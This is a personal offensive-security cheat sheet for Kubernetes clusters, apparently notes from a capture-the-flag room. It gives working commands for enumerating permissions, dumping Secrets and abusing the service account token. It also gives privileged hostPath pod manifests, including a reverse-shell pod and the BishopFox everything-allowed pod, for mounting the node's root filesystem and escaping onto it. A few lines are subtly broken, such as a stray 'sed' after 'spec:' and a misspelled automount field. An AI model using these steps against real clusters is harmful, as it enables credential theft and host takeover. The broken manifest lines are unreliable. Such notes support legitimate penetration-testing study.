
For [[Kubernetes]] information follow the link

No `microk8s` no problem get official `kubectl` binary here: [Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/); official `curl` commandage..
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

# ARM4
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/arm64/kubectl"

```

Enumerate permissions
```bash
microk8s kubectl auth can-i --list
# If you see:
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
# You can do anything
```

Enumerate pods and namespaces, image name
```bash
env # services are often stored as environment variables

microk8s kubectl get namespace
microk8s kubectl get pods
microk8s kubectl get pod $pod -o yaml # get the image: $field of current pod
microk8s kubectl get nodes
microk8s kubectl get deployments
microk8s kubectl get services
microk8s kubectl get ingress
microk8s kubectl get jobs
```

Find Secrets - secret values in resources called Secrets that get mounted into pods as either environment variables or files
```bash
kubectl get secrets
kubectl describe secret $secretName
kubectl get secret $secretName -o 'json'
```

Token Abuse
```bash
# /var/run/secrets/kubernetes.io/serviceaccount/token
./kubectl auth can-i --list --token=${TOKEN}
./kubectl get pods --token=${TOKEN}
./kubectl get serviceaccount --token=${TOKEN}
# execute bash on a pod
/kubectl exec -it $pod --token=${TOKEN} -- /bin/bash
```


####  Make a pod and mount away!

May require token
```bash
# /var/run/secrets/kubernetes.io/serviceaccount/token
./kubectl auth can-i --list --token=${TOKEN}
# Get the image for privesc.yml
kubectl get pods --all-namespaces -o jsonpath="{.items[*].spec.containers[*].image}" --token=${TOKEN} | tr -s '[[:space:]]' '\n' | sort | uniq -c

```
[List all container images in all namespaces](https://kubernetes.io/docs/tasks/access-application-cluster/list-all-running-container-images/)

Create a YAML file to create a pod to run as root - named kubeRevShell.yaml - [prettifer](https://onlineyamltools.com/prettify-yaml) 
```YAML
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: kube-system
spec:sed 
  containers:
    - name: shell
      image: # GET THE IMAGE NAME OF CURRENT POD
      # imagePullPolicy: IfNotPresent 
      command: ['/bin/sh']
      args: ['-c', 'sleep 300000']
      volumeMounts:
        - mountPath: /mnt
          name: hostfs
  volumes:
    - name: hostfs
      hostPath:
        path: /
  autommountServiceAccountToken: true
  hostNetwork: true
```

[BishopFox BadPod.yml](https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)
```yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent 
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```



Beware:
`name:` must be a lowercase RFC 1123 label.

Apply this configuration
```bash
microk8s kubectl apply -f kubeRevShell.yaml
```

Check the status of the pod
```bash
microk8s kubectl get pods -n kube-system # display kube-system namespace
```
https://tryhackme.com/room/insekube
Exec a very minimal shell, works as nested `nc` no tty... 
```bash
./kubectl exec some-pod -n kube-system --stdin --tty -- /bin/bash
# Or
./kubectl exec -it some-pod --token=${TOKEN} -- /bin/bash
```
```

Clean up yourself 
```bash
./kubectl delete -f kubeShell.yaml
```

#### Kubernetes Token Abuse

`cat /var/run/secrets/kubernetes.io/$account/token`

Pod breakout

Privilege Escape

Cloud Hackinghttps://tryhackme.com/room/insekube

## References

[Online YAML prettifier](https://onlineyamltools.com/prettify-yaml)
[Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/);
[THM Insekube Room](https://tryhackme.com/room/insekube)